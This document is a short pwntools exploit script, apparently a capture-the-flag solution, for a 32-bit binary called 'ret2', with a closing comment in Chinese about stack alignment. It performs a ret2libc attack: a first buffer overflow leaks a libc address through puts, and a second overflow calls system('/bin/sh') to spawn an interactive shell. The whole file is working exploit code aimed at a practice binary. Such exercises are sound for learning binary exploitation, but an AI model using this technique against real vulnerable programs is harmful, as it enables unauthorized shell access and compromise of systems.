from pwn import *
sh = process('./ret2')
elf = ELF('./ret2')
libc = elf.libc

off_system = libc.symbols['system']
off_libc_start_main = libc.symbols['__libc_start_main']

plt_puts = elf.plt['puts']
main = elf.symbols['main']
got_libc_start_main = elf.got['__libc_start_main']

payload1 = 'a'*112 + p32(plt_puts) + p32(main) + p32(got_libc_start_main)
sh.sendlineafter("Can you find it !?",payload1)
res=u32(sh.recv()[0:4])
libc_base = res - off_libc_start_main
success("libc base 0x%x"%libc_base)

libc.address = libc_base
system_addr = libc_base + off_system
payload2 = 'a'*104 + p32(system_addr) + p32(0xdeabeaf) + p32(next(libc.search("/bin/sh")))
#payload2 = 'a'*104 + p32(libc.sym["system"]) + p32(0xdeabeaf) + p32(next(libc.search("/bin/sh")))
sh.sendline(payload2)
sh.interactive()
'''
这题的坑是第一次和第二次溢出长度不同。原因是main函数对esp做了与0xfffffff0操作，所以在esp给ebp赋值之后已经减小了8
第二次由于esp已经对齐（可以通过栈位置看出esp比第一次进入main函数时大8，也就是说最低位已经变为0，和0xfffffff0相与没有任何影响）
直接根据ida中char s的位置算出来即可
'''
